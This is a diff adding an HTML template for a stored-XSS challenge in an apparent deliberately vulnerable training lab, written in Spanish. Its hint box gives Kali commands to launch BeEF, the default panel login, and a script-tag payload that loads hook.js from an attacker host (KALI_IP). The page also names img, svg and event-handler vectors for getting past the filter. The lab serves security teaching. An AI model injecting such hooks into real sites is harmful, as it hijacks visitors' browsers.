@@ -1,0 +1,59 @@
+{% extends "base.html" %}
+{% block title %}C7 – Stored XSS / BeEF | VulnMachine{% endblock %}
+{% block content %}
+
+<div class="flex gap-2 mb-2" style="flex-direction:column; align-items:flex-start;">
+  <a href="/" class="btn btn-ghost" style="font-size:0.72rem; padding:0.3rem 0.8rem;">← /home</a>
+  <div style="font-size:0.62rem; color:var(--muted); letter-spacing:3px; text-transform:uppercase;">challenge_07.sh</div>
+  <h1>STORED XSS</h1>
+  <h2>Cross-Site Scripting almacenado — BeEF Browser Hook</h2>
+</div>
+
+<div class="card mb-2">
+  <p style="font-size:0.82rem; color:var(--text); line-height:1.85; font-family:var(--font-mono);">
+    El foro de comentarios guarda las entradas en la DB y las renderiza como HTML sin sanitizar.<br>
+    Inyecta el hook de <span style="color:var(--green);">BeEF</span> para tomar control del navegador de la víctima.<br><br>
+    <span style="color:var(--green-dim);">[LVL 1]</span> Sin ningún filtro — XSS directo con <code style="color:var(--green); background:rgba(0,255,65,0.08); padding:1px 4px; border:1px solid var(--green-dark);">&lt;script&gt;</code>.<br>
+    <span style="color:var(--warn);">[LVL 2]</span> Filtra <code style="color:var(--green); background:rgba(0,255,65,0.08); padding:1px 4px; border:1px solid var(--green-dark);">&lt;script&gt;</code> pero hay otros vectores XSS que lo bypasean.
+  </p>
+</div>
+
+<div class="grid-2">
+  <div class="card" style="border-color:var(--green-dark); text-align:center;">
+    <div style="font-family:var(--font-vt); font-size:3.5rem; color:var(--green); text-shadow:var(--glow); margin-bottom:0.4rem; line-height:1;">1</div>
+    <div style="font-size:0.85rem; letter-spacing:1px; margin-bottom:0.5rem; color:var(--text);">XSS Sin Filtro</div>
+    <span class="badge badge-easy">SIN PROTECCIÓN</span>
+    <p style="font-size:0.78rem; color:var(--text); margin:1rem 0; line-height:1.7; font-family:var(--font-mono);">
+      El contenido se guarda en la DB y se renderiza como HTML.<br>
+      Inyecta el hook de BeEF directamente.
+    </p>
+    <a href="/challenge/7/level1" class="btn btn-primary" style="width:100%; text-align:center;">&gt; acceder</a>
+  </div>
+
+  <div class="card" style="border-color:rgba(255,179,0,0.25); text-align:center;">
+    <div style="font-family:var(--font-vt); font-size:3.5rem; color:var(--warn); margin-bottom:0.4rem; line-height:1;">2</div>
+    <div style="font-size:0.85rem; letter-spacing:1px; margin-bottom:0.5rem; color:var(--text);">Filtro Bypasseable</div>
+    <span class="badge badge-medium">WAF PARCIAL</span>
+    <p style="font-size:0.78rem; color:var(--text); margin:1rem 0; line-height:1.7; font-family:var(--font-mono);">
+      Bloquea <code style="color:var(--green); background:rgba(0,255,65,0.08); padding:1px 4px; border:1px solid var(--green-dark);">&lt;script&gt;</code> pero olvida
+      <code style="color:var(--green); background:rgba(0,255,65,0.08); padding:1px 4px; border:1px solid var(--green-dark);">&lt;img&gt;</code>,
+      <code style="color:var(--green); background:rgba(0,255,65,0.08); padding:1px 4px; border:1px solid var(--green-dark);">&lt;svg&gt;</code> y event handlers.
+    </p>
+    <a href="/challenge/7/level2" class="btn btn-primary" style="width:100%; text-align:center; border-color:var(--warn); color:var(--warn);">&gt; acceder</a>
+  </div>
+</div>
+
+<div class="hint-box mt-3">
+  <div class="hint-title">cómo usar BeEF desde Kali</div>
+  <p>
+    <strong style="color:var(--green-dim);">1. Inicia BeEF en Kali:</strong><br>
+    <code>cd /usr/share/beef-xss && ./beef</code><br><br>
+    <strong style="color:var(--green-dim);">2. Panel de control BeEF:</strong><br>
+    <code>http://127.0.0.1:3000/ui/panel</code> &nbsp;(usuario: beef / contraseña: beef)<br><br>
+    <strong style="color:var(--green-dim);">3. Payload para nivel 1 (reemplaza KALI_IP):</strong><br>
+    <code>&lt;script src="http://KALI_IP:3000/hook.js"&gt;&lt;/script&gt;</code><br><br>
+    <strong style="color:var(--green-dim);">4. Cuando el navegador cargue la página con el comentario,</strong> aparecerá como "hooked" en el panel de BeEF.
+  </p>
+</div>
+
+{% endblock %}
